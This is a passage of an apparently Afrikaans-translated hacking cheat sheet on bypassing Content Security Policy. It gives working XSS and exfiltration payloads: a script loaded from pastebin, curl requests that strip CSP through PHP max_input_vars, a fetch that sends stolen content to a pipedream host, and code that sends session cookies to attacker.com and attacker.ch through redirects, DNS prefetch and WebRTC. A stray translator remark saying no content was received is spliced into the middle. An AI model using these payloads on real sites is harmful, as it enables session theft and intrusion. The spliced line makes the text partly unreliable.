Vir meer inligting [**kyk na die oorspronklike verslag hier**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP-omseiling deur CSP te beperk

In [**hierdie CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), word CSP omseil deur binne 'n toegelate iframe 'n meer beperkende CSP in te spuit wat die laai van 'n spesifieke JS file verhoed het wat, dan, via **prototype pollution** of **dom clobbering** toegelaat het om **'n ander script te misbruik om 'n arbitrêre script te laai**.

Jy kan **die CSP van 'n Iframe beperk** met die **`csp`** attribute:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
In [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), dit was moontlik via **HTML injection** om 'n **CSP** verder te **beperk**, sodat 'n script wat CSTI voorkom gedeaktiveer is en gevolglik die **kwetsbaarheid uitgebuit kon word.**\
CSP kan meer beperkend gemaak word deur **HTML meta tags** en inline scripts kan gedeaktiveer word deur die **verwydering** van die **inskrywing** wat hul **nonce** toelaat en **enable specific inline script via sha**:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration with Content-Security-Policy-Report-Only

Indien jy daarin slaag om die server te laat reageer met die kopstuk **`Content-Security-Policy-Report-Only`** met 'n **waarde wat deur jou beheer word** (miskien as gevolg van 'n CRLF), kan jy dit na jou server laat wys, en as jy die **JS content** wat jy wil exfiltrate met **`<script>`** omsluit, en aangesien dit hoogs waarskynlik is dat `unsafe-inline` nie deur die CSP toegelaat word nie, sal dit 'n **CSP error** veroorsaak en 'n deel van die skrip (wat die sensitiewe inligting bevat) na die server gestuur word deur `Content-Security-Policy-Report-Only`.

Vir 'n voorbeeld [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking Inligting met CSP en Iframe

- 'n `iframe` word geskep wat na 'n URL wys (kom ons noem dit `https://example.redirect.com`) wat deur CSP toegelaat word.
- Hierdie URL herlei dan na 'n geheime URL (bv., `https://usersecret.example2.com`) wat **nie toegelaat** word deur CSP.
- Deur na die `securitypolicyviolation` event te luister, kan mens die `blockedURI` property vang. Hierdie property openbaar die domein van die geblokkeerde URI, leaking die geheime domein waarheen die aanvanklike URL herlei het.

Dit is interessant om op te let dat blaaiers soos Chrome en Firefox verskillende gedragspatrone het in die hantering van iframes met betrekking tot CSP, wat kan lei tot die blootstelling van sensitiewe inligting as gevolg van ongedefinieerde gedrag.

Nog 'n tegniek behels die uitbuiting van die CSP self om die geheime subdomein af te lei. Hierdie metode berus op 'n binaire soekalgoritme en die aanpassing van die CSP om spesifieke domeine in te sluit wat opsetlik geblokkeer word. Byvoorbeeld, as die geheime subdomein uit onbekende karakters bestaan, kan jy iteratief verskillende subdomeine toets deur die CSP-direktief te wysig om hierdie subdomeine te blokkeer of toe te laat. Hier is 'n snip wat wys hoe die CSP opgestel kan word om hierdie metode te vergemaklik:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Deur te monitor watter requests deur die CSP geblokkeer of toegelaat word, kan mens die moontlike karakters in die geheime subdomein beperk en uiteindelik die volledige URL ontbloot.

Beide metodes benut die nuanses van CSP-implementering en -gedrag in blaaiers, en toon hoe skynbaar veilige beleide per ongeluk kan leak sensitiewe inligting.

Trick from [**here**](https://ctftime.org/writeup/29310).

## Onveilige tegnologieë om CSP te omseil

### PHP-foute wanneer te veel params

Volgens die [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM), stuur te veel parameters (1001 GET parameters alhoewel jy dit ook met POST params en meer as 20 files kan doen). Enige gedefinieerde **`header()`** in die PHP-webkode **won't be sent** weens die fout wat dit sal veroorsaak.

### PHP response buffer overload

PHP is bekend daarvoor dat dit die response na 4096 bytes standaard buffer. Daarom, as PHP 'n waarskuwing vertoon, kan die response deur voldoende data in waarskuwings te plaas, **sent** word **before** die **CSP header**, wat veroorsaak dat die header geïgnoreer word.\
Die tegniek bestaan basies daarin om die response-buffer met waarskuwings te vul sodat die CSP-header nie gestuur word nie.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Kill CSP via max_input_vars (headers already sent)

Omdat headers voor enige output gestuur moet word, kan waarskuwings wat deur PHP uitgegee word latere `header()`-aanroepe ongeldig maak. As gebruikersinvoer `max_input_vars` oorskry, gooi PHP eers 'n startup warning; enige volgende `header('Content-Security-Policy: ...')` sal misluk met “headers already sent”, wat effektief CSP deaktiveer en andersins-geblokkeerde reflective XSS toelaat.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Ek het geen inhoud ontvang om te vertaal nie. Plak asseblief die inhoud van src/pentesting-web/content-security-policy-csp-bypass/README.md wat jy wil hê ek moet vertaal, dan vertaal ek dit na Afrikaans volgens die gegewe riglyne.
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Herskryf foutbladsy

Volgens [**this writeup**](https://blog.ssrf.kr/69) blyk dit dat dit moontlik was om 'n CSP-beskerming te omseil deur 'n foutbladsy (potensieel sonder CSP) te laai en die inhoud daarvan te herskryf.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME is 'n tegniek wat 'n XSS (of sterk beperkte XSS) misbruik **in an endpoint of a page** om **ander endpoints van dieselfde oorsprong te misbruik.** Dit word gedoen deur die kwetsbare endpoint vanaf 'n aanvallersbladsy te laai en dan die aanvallersbladsy te verfris na die regte endpoint in dieselfde oorsprong wat jy wil misbruik. Op hierdie manier kan die **vulnerable endpoint** die **`opener`** object in die **payload** gebruik om toegang tot die **DOM** van die **real endpoint to abuse** te kry. Vir meer inligting kyk:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Boonop het **wordpress** 'n **JSONP** endpoint in `/wp-json/wp/v2/users/1?_jsonp=data` wat die **data** wat gestuur word in die uitset **reflekt** (met die beperking tot slegs letters, syfers en punte).

'n Aanvaller kan daardie endpoint misbruik om **generate a SOME attack** teen WordPress en dit **embed** binne `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` noot dat hierdie **script** **loaded** sal word omdat dit deur **'self'** toegelaat word. Verder, en omdat WordPress geïnstalleer is, kan 'n aanvaller die **SOME attack** misbruik deur die **vulnerable** **callback** endpoint wat die **CSP** **bypasses** om meer voorregte aan 'n gebruiker te gee, 'n nuwe plugin te installeer...\
Vir meer inligting oor hoe om hierdie attack uit te voer, kyk [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Eksfiltrasie Omseilings

As daar 'n streng CSP is wat jou nie toelaat om **interact with external servers** nie, is daar 'n paar dinge wat jy altyd kan doen om die inligting te eksfiltreer.

### Location

Jy kan eenvoudig die location opdateer om die geheime inligting na die aanvaller se bediener te stuur:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Jy kan herlei deur 'n meta-tag in te voeg (dit is net 'n redirect, dit sal nie leak inhoud nie)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Om bladsye vinniger te laai, sal blaaiers hostnames vooraf na IP-adresse oplos en dit in die kas stoor vir later gebruik.\
Jy kan 'n blaaier aandui om 'n hostname vooraf op te los met: `<link rel="dns-prefetch" href="something.com">`

Jy kan hierdie gedrag misbruik om **sensitiewe inligting via DNS-versoeke te eksfiltreer**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Nog 'n manier:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Om te voorkom dat dit gebeur, kan die bediener die HTTP header stuur:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Skynbaar werk hierdie tegniek nie in headless browsers (bots) nie

### WebRTC

Op verskeie bladsye kan jy lees dat **WebRTC die `connect-src` beleid van die CSP nie nagaan**.

Eintlik kan jy _leak_ inligting deur 'n _DNS request_ te gebruik. Kyk na hierdie kode:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Nog 'n opsie:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

Die credential popup stuur 'n DNS-versoek na die iconURL sonder dat dit deur die bladsy beperk word. Dit werk slegs in 'n veilige konteks (HTTPS) of op localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## Kontroleer CSP-beleid aanlyn

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## CSP outomaties skep

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Verwysings

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
